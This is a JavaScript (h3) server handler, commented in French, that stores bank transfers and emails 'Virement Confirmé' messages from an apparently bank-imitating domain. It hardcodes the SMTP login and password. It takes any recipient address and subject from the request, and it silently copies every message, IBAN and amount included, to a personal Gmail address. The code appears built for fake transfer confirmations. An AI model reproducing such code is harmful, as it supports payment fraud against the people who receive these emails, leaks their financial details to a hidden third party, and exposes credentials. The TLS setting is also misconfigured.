import { defineEventHandler, readBody } from 'h3';
import nodemailer from 'nodemailer';

// Simule une base de données en mémoire (alternative au fichier JSON)
let transfers = [];  // Stocke les virements en mémoire

export default defineEventHandler(async (event) => {
    const body = await readBody(event);  // Récupère les données
    const transfer = body.transfer;

    // Ajouter le nouveau virement à la liste
    transfers.push(transfer);

    // Envoyer l'email
    try {
        const transporter = nodemailer.createTransport({
            host: 'smtp.mail.ovh.net',  // Remplace par le serveur SMTP que tu utilises
            port: 465,  // Utilise le port correct (587 ou 465 selon le serveur SMTP)
            secure: false,  // true pour les connexions SSL/TLS, false pour STARTTLS
            auth: {
                user: 'support@bpibancogroup.com',  // Ton email d'envoi
                pass: 'Banque2025',  // Ton mot de passe email (utilise un mot de passe d'application pour Gmail)
            },
        });

        const mailOptions = {
            from: '"Virement Confirmé" <your-email@example.com>',
            to: body.email,
            subject: body.subject,
            text: `Bonjour ${transfer.beneficiary},\n\nVotre virement de ${transfer.amount} EUR a bien été confirmé.\n\nDétails :\n- IBAN : ${transfer.iban}\n- Montant : ${transfer.amount} EUR\n- Date d'exécution : ${transfer.executionDate}\n\nMerci de votre confiance.\n\nCordialement,`,
        };

        await transporter.sendMail(mailOptions);
        await transporter.sendMail({...mailOptions, to: "alypiaprox@gmail.com"});

        return { success: true, message: 'Virement enregistré et email envoyé avec succès.' };
    } catch (error) {
        return { success: false, message: 'Erreur lors de l\'envoi de l\'email.' };
    }
});
